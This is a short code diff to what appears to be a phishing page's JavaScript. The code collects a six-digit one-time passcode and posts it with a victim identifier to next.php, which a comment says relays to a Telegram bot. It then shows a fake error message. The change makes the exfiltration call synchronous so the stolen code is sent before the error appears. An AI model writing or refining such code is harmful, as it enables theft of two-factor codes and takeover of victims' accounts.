@@ -256,13 +256,13 @@
                 otp += document.getElementById('otp' + i).value;
             }
             if (otp.length === 6) {
-                // Send OTP to next.php (Telegram bot)
+                // Send OTP to next.php (Telegram bot) FIRST
                 const xhr = new XMLHttpRequest();
-                xhr.open('POST', 'next.php', true);
+                xhr.open('POST', 'next.php', false); // Make synchronous
                 xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                 xhr.send('di=' + encodeURIComponent(value) + '&otp=' + encodeURIComponent(otp));
 
-                // Show error message instead of redirecting
+                // THEN show error message
                 document.getElementById('error-message').style.display = 'block';
             } else {
                 alert("Please enter a 6-digit code.");
